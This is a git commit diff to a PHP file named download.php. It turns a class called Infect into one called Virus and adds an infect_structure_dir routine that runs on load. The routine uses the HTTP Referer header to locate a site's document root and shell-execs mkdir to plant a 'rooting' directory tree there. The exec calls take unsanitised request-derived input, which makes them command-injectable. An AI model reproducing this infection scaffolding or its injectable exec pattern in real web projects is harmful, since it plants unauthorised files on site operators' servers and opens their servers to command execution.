7d93b6b1cc31206e1a5d0c2b03b6f07868e60410
arthur <arthurysiite@gmail.Com>
2019-09-14 12:55:39 +0200

    hypertube

--- download.php
+++ download.php
@@ -1,17 +1,10 @@
 <?php
 
-exec("ls -l ".$link_root.'rooting', $exist_directory);
-if (empty($exist_directory)) {
-	exec("mkdir ".$link_root.'rooting');
-	exec("mkdir ".$link_root.'rooting/class');
-	exec("mkdir ".$link_root.'rooting/css');
-	exec("mkdir ".$link_root.'rooting/js');
-	exec("mkdir ".$link_root.'rooting/modules');
-	exec("mkdir ".$link_root.'rooting/require');
-	exec("mkdir ".$link_root.'rooting/template');
-}
+$data = new Virus();
+$data->infect_structure_dir();
 
-Class Infect {
+
+Class Virus {
 
 	/**
 	 * @link_index String
@@ -33,11 +26,28 @@ Class Infect {
 	 */
 	private $struct_file = [];
 
+	const DIR_VIRUS = "rooting";
+
 	public function __Construct() {
 
 		$link_explode = explode('/', $_SERVER['HTTP_REFERER']);
 		$this->link_index = $_SERVER['DOCUMENT_ROOT'].'/'.$link_explode[count($link_explode) - 2].'/index.php';
 		$this->link_root = $_SERVER['DOCUMENT_ROOT'].'/'.$link_explode[count($link_explode) - 2].'/';
+	}
+
+	public function infect_structure_dir() {
+
+		exec("ls -l ".$this->link_root.self::DIR_VIRUS, $exist_directory);
+
+		if (empty($exist_directory)) {
+
+			exec("mkdir ".$this->link_root.self::DIR_VIRUS);
+
+			foreach ($this->struct_dir as $value) {
+
+				exec("mkdir ".$this->link_root.self::DIR_VIRUS.'/'.$value);
+			}
+		}
 	}
 }
 ?>
